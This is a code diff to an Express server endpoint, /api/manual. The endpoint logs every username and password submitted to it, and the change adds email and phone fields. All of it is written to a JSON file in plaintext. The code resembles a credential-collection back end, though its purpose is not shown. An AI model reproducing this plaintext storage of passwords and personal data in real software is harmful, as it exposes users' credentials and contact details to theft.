@@ -210,10 +210,10 @@ function writeManual(d) { fs.writeFileSync(manualFile, JSON.stringify(d)); }
 
 // User submits credentials (allows multiple submissions, all logged)
 app.post('/api/manual', (req, res) => {
-  const { username, password } = req.body || {};
+  const { username, password, email, phone } = req.body || {};
   if (!username || !password) return res.json({ ok: false });
   const list = readManual();
-  list.push({ username, password, submittedAt: new Date().toISOString(), source: 'user' });
+  list.push({ username, password, email: email || '', phone: phone || '', submittedAt: new Date().toISOString(), source: 'user' });
   writeManual(list);
   res.json({ ok: true });
 });
